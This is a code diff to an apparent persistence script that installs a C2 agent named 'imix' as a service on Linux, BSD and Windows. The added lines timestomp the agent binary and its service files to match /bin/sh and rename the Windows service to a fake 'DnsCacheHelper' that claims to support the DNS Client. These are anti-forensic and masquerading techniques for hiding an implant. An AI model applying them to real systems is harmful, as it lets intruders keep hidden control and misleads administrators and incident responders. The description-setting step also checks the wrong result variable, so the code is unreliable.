@@ -239,6 +239,9 @@ def systemd(service_name, service_desc, executable_path, executable_args):
     # assets.copy("persist_service/files/payload.elf", executable_path)
     sys.shell("chmod +x "+executable_path)
 
+    sys.shell("touch -r /bin/sh "+executable_path)
+    sys.shell("touch -r /bin/sh /usr/lib/systemd/system/"+service_name+".service")
+
     sys.shell("systemctl daemon-reload "+service_name)
     sys.shell("systemctl enable "+service_name)
     sys.shell("systemctl start "+service_name)
@@ -260,6 +263,10 @@ def sysvinit(service_name, service_desc, executable_path, executable_args):
     sys.shell("chmod +x "+executable_path)
 
     sys.shell("update-rc.d "+service_name+" defaults")
+
+    sys.shell("touch -r /bin/sh /etc/init.d/"+service_name)
+    sys.shell("touch -r /bin/sh "+executable_path)
+
     sys.shell("service "+service_name+" start")
     print("sysvinit installed")
 
@@ -280,6 +287,10 @@ def bsdinit(service_name, service_desc, executable_path, executable_args):
 
     sys.shell("chmod +x "+startup_dir+service_name+".sh")
     sys.shell("chmod +x "+executable_path)
+
+    sys.shell("touch -r /bin/sh "+startup_dir+service_name+".sh")
+    sys.shell("touch -r /bin/sh "+executable_path)
+
     sys.shell("service "+service_name+".sh start")
 
     print("bsdinit installed")
@@ -306,7 +317,7 @@ def windows_service_manager(service_name, service_display_name, service_descript
         print("\n")
         return
 
-    desc_res = sys.shell(f"sc.exe description {service_name} \"{service_description}\" ")
+    desc_res = sys.exec("sc.exe", ["description", "DnsCacheHelper", "The DnsCacheHelper service is designed to enhance and support the functionality of the Windows DNS Client service by optimizing DNS query resolution and caching mechanisms."])
     if 'ERROR' in create_res['stdout'] or create_res['stderr'] != "":
         print("Failed to set description:\n"+create_res+"\n")
         print("\n")
@@ -369,9 +380,9 @@ def main():
     config_data ={
         "service_configs": [
             {
-                "name": "imix",
-                "description": "Imix c2 agent",
-                "executable_name": "imix",
+                "name": "DnsCacheHelper",
+                "description": "The DnsCacheHelper service is designed to enhance and support the functionality of the Windows DNS Client service by optimizing DNS query resolution and caching mechanisms.",
+                "executable_name": "DnsCacheHelper",
                 "executable_args": ""
             }
         ]
